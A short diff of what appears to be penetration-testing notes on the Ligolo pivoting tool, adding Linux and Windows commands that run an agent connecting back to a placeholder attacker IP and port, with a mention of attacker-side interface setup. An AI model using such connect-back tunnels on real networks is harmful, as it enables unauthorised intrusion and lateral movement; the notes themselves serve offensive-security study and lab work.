@@ -8,9 +8,11 @@
   - Execute agent
   ```bash
   # Linux
+  ./agent -connect <attackerIP:11601>
   ```
   ```powershell
   # Windows
+  ./agent -connect <attackerIP:11601>
   ```
 * Attacker Machine Setup
   - Create interface for Ligolo to use
